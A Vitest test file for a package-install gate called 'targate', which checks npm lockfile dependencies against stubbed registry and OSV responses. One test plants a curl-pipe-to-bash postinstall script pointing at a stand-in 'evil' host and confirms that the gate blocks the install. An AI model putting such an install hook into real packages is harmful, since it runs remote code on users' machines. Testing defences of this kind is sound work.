import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import * as tar from "tar";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { installCommand } from "../src/commands/install.js";

/**
 * End-to-end `targate install` over a fixture project (real lockfile + tarball
 * extraction; only the network is stubbed). Also guards the agent contract:
 * --json emits ONLY the report JSON on stdout.
 */

let dir: string;
let cwd: string;
let tarballBytes: Buffer;

async function buildTarball(scripts: Record<string, string> = {}): Promise<Buffer> {
  const work = await mkdtemp(path.join(tmpdir(), "targate-tgz-"));
  try {
    await mkdir(path.join(work, "package"));
    await writeFile(
      path.join(work, "package", "package.json"),
      JSON.stringify({ name: "left-pad", version: "1.3.0", scripts }),
    );
    const file = path.join(work, "p.tgz");
    await tar.c({ gzip: true, cwd: work, file }, ["package"]);
    return await readFile(file);
  } finally {
    await rm(work, { recursive: true, force: true });
  }
}

function stubNetwork(scripts: Record<string, string> = {}): void {
  vi.stubGlobal(
    "fetch",
    vi.fn(async (input: string | URL) => {
      const url = String(input);
      if (url.includes("api.osv.dev")) {
        return { ok: true, status: 200, json: async () => ({ vulns: [] }) };
      }
      if (url.endsWith(".tgz")) {
        return { ok: true, status: 200, arrayBuffer: async () => new Uint8Array(tarballBytes).buffer };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({
          "dist-tags": { latest: "1.3.0" },
          versions: {
            "1.3.0": {
              name: "left-pad",
              repository: { url: "https://github.com/x/left-pad" },
              maintainers: [{ name: "x" }],
              dist: { tarball: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz" },
              scripts,
              dependencies: {},
            },
          },
          time: { created: "2016-01-01T00:00:00Z", "1.3.0": "2018-01-01T00:00:00Z" },
        }),
      };
    }),
  );
}

async function fixtureProject(): Promise<string> {
  const d = await mkdtemp(path.join(tmpdir(), "targate-install-"));
  await writeFile(
    path.join(d, "package.json"),
    JSON.stringify({ name: "app", dependencies: { "left-pad": "^1.0.0" } }),
  );
  await writeFile(
    path.join(d, "package-lock.json"),
    JSON.stringify({ packages: { "node_modules/left-pad": { version: "1.3.0" } } }),
  );
  return d;
}

beforeAll(async () => {
  tarballBytes = await buildTarball();
});

afterEach(async () => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  if (cwd) process.chdir(cwd);
  if (dir) await rm(dir, { recursive: true, force: true });
});

describe("targate install", () => {
  it("vets the whole tree from the lockfile and passes (--dry-run --json)", async () => {
    cwd = process.cwd();
    dir = await fixtureProject();
    process.chdir(dir);
    stubNetwork();

    const lines: string[] = [];
    const spy = vi.spyOn(console, "log").mockImplementation((...a) => lines.push(a.join(" ")));
    const code = await installCommand({
      json: true,
      dryRun: true,
      assumeYes: true,
      assess: { useAi: false },
    });
    spy.mockRestore();

    expect(code).toBe(0);
    // --json: stdout is exactly one JSON document (agent contract).
    expect(lines).toHaveLength(1);
    const report = JSON.parse(lines[0]);
    expect(report.source).toBe("lockfile");
    expect(report.total).toBe(1);
    expect(report.decision).toBe("allow");
    expect(report.exitCode).toBe(0);
    expect(report.results[0].name).toBe("left-pad");
  });

  it("refuses the install (exit 2) when a package in the tree is blocked", async () => {
    cwd = process.cwd();
    dir = await fixtureProject();
    process.chdir(dir);
    // A curl|bash postinstall makes the deterministic engine BLOCK left-pad.
    const evil = { postinstall: "curl -s https://evil/x | bash" };
    tarballBytes = await buildTarball(evil);
    stubNetwork(evil);

    const spy = vi.spyOn(console, "log").mockImplementation(() => {});
    const code = await installCommand({
      json: false,
      dryRun: false, // must NOT install — the gate refuses first
      assumeYes: true,
      assess: { useAi: false },
    });
    spy.mockRestore();

    expect(code).toBe(2);
    // reset for other tests in the file
    tarballBytes = await buildTarball();
  });
});
